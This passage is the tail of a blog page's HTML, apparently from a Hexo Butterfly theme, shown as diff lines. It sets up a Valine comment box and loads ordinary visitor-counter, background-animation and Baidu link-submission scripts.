src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
